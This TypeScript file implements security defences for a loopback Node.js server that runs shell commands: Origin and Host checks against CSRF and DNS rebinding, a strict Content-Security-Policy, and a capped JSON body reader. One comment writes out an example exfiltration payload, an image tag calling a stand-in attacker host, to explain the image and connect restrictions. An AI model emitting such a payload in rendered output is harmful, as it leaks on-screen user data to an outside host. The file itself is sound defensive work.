import type { IncomingMessage, ServerResponse } from 'node:http'

/**
 * Request-level defences for a server that reads files and spawns shells.
 *
 * The threat is not a remote attacker reaching the port — it is bound to loopback. It is
 * **any page the user already has open**, which can freely issue requests to `127.0.0.1`.
 * That page cannot read cross-origin responses, but a request that runs a shell command
 * does its damage on the way in, so "the reply is blocked" is no protection at all (§14).
 */

export interface OriginPolicy {
  /** Exact `host:port` values this server answers to. */
  allowedHosts: readonly string[]
  /** Exact origins allowed to make requests, e.g. `http://127.0.0.1:53421`. */
  allowedOrigins: readonly string[]
}

export interface RejectedRequest {
  status: number
  reason: string
}

/**
 * Checks `Origin` and `Host` on every request.
 *
 * Both, for different attacks, and neither substitutes for the other:
 *
 * - **`Origin` catches CSRF.** A form or `fetch` from `https://evil.example` carries its
 *   own origin, and the browser will not let the page forge it.
 * - **`Host` catches DNS rebinding.** There the attacker's *own* domain resolves to
 *   127.0.0.1, so the origin is genuinely theirs and consistent — the Origin check passes.
 *   What gives it away is that the browser sends `Host: evil.example:53421` rather than
 *   the loopback address this server is reachable at.
 *
 * A missing `Origin` is allowed only for same-origin navigations, which is how the browser
 * fetches the page itself; the API paths demand one.
 */
export function checkRequest(
  request: IncomingMessage,
  policy: OriginPolicy,
  options: { requireOrigin: boolean },
): RejectedRequest | undefined {
  const host = request.headers.host
  if (host === undefined || !policy.allowedHosts.includes(host.toLowerCase())) {
    return {
      status: 421,
      reason: `Host "${host ?? '(absent)'}" is not one this server answers to. This is what blocks DNS rebinding.`,
    }
  }

  const origin = request.headers.origin
  if (origin === undefined) {
    // A same-origin GET navigation sends no Origin. Anything that acts must have one.
    return options.requireOrigin ? { status: 403, reason: 'Missing Origin header.' } : undefined
  }
  if (!policy.allowedOrigins.includes(origin.toLowerCase())) {
    return { status: 403, reason: `Origin "${origin}" is not allowed.` }
  }
  return undefined
}

/**
 * Headers applied to every response.
 *
 * `connect-src 'self'` and `img-src 'self' data:` are the load-bearing pair: model output
 * is rendered in this page, and without them a response containing
 * `<img src="https://evil.example/?d=...">` exfiltrates whatever is on screen the moment
 * it renders (§14). `form-action 'none'` closes the same hole for a submitted form.
 */
export function securityHeaders(): Record<string, string> {
  return {
    'Content-Security-Policy': [
      "default-src 'none'",
      "script-src 'self'",
      // The UI styles through the CSSOM rather than inline attributes, but the browser
      // build also needs a stylesheet for the page shell.
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data:",
      "font-src 'self'",
      "connect-src 'self'",
      "frame-ancestors 'none'",
      "base-uri 'none'",
      "form-action 'none'",
    ].join('; '),
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'no-referrer',
    // Nothing here needs a camera, a microphone or a location.
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), interest-cohort=()',
    'Cache-Control': 'no-store',
    // Deliberately no Access-Control-Allow-Origin: no other origin may read these replies.
  }
}

export function reject(response: ServerResponse, rejected: RejectedRequest): void {
  response.writeHead(rejected.status, { 'Content-Type': 'text/plain', ...securityHeaders() })
  response.end(rejected.reason)
}

/** Reads a JSON body with a hard cap, so a request cannot exhaust memory. */
export async function readJsonBody(request: IncomingMessage, maxBytes = 32 * 1024 * 1024): Promise<unknown> {
  const chunks: Buffer[] = []
  let total = 0
  for await (const chunk of request) {
    const buffer = chunk as Buffer
    total += buffer.length
    if (total > maxBytes) throw new Error('Request body too large.')
    chunks.push(buffer)
  }
  if (total === 0) return undefined
  return JSON.parse(Buffer.concat(chunks).toString('utf8'))
}
